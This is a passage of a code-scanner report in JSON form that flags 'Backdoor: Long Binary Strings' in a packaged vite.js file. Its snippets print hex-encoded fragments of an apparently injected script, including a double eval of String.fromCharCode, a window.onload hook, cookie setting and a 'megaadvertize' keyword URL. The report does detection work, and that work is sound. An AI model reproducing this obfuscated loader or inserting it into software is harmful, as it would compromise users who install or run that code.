\"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35",
                    "rendered": {
                      "text": "\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35",
                      "markdown": "`\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 4843,
                  "endLine": 4,
                  "endColumn": 5271,
                  "snippet": {
                    "text": "\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35",
                    "rendered": {
                      "text": "\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35",
                      "markdown": "`\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 4391,
                  "endLine": 4,
                  "endColumn": 4819,
                  "snippet": {
                    "text": "\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34",
                    "rendered": {
                      "text": "\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34",
                      "markdown": "`\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3959,
                  "endLine": 4,
                  "endColumn": 4387,
                  "snippet": {
                    "text": "\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65",
                    "rendered": {
                      "text": "\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65",
                      "markdown": "`\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\", \"\\x28\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x28\\x29\\x7b\\x76\\x61\\x72\\x20\\x6e\\x61\\x64\\x74\\x66\\x3d\\x22\\x22\\x3b\\x76\\x61\\x72\\x20\\x66\\x65\\x69\\x64\\x64\\x3d\\x22\\x37\\x37\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3527,
                  "endLine": 4,
                  "endColumn": 3955,
                  "snippet": {
                    "text": "\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", \"\\x37\\x33\\x62\\x32\\x30\\x36\\x35\\x37\\x38\\x37\\x30\\x36\\x39\\x37\\x32\\x36\\x35\\x37\\x33\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x34\\x32\\x65\\x37\\x34\\x36\\x66\\x35\\x35\\x35\\x34\\x34\\x33\\x35\\x33\\x37\\x34\\x37\\x32\\x36\\x39\\x36\\x65\\x36\\x37\\x32\\x38\\x32\\x39\\x32\\x30\\x33\\x61\\x32\\x30\\x32\\x37\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37",
                    "rendered": {
                      "text": "\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74\\x72\\x69\\x6e\\x67\\x2e\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x28\\x27\\x2b\\x6e\\x61\\x64\\x74\\x66\\x2b\\x27\\x29\\x27\\x29\\x29\\x3b\\x7d\", \"\\x36\\x36\\x36\\x66\\x32\\x66\\x36\\x64\\x36\\x35\\x36\\x37\\x36\\x31\\x36\\x31\\x36\\x34\\x37\\x36\\x36\\x35\\x37\\x32\\x37\\x34\\x36\\x39\\x37\\x61\\x36\\x35\\x32\\x66\\x33\\x66\\x36\\x62\\x36\\x35\\x37\\x39\\x37\\x37\\x36\\x66\\x37\\x32\\x36\\x34\\x33\\x64\\x33\\x34\\x33\\x38\\x33\\x38\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x35\\x33\\x38\\x33\\x32\\x36\\x36\\x36\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x34\\x33\\x30\\x33\\x32\\x33\\x30\\x33\\x32\\x33\\x37\\x33\\x31\\x33\\x37\\x36\\x32\\x33\\x36\\x33\\x32\\x36\\x34\\x33\\x35\\x33\", 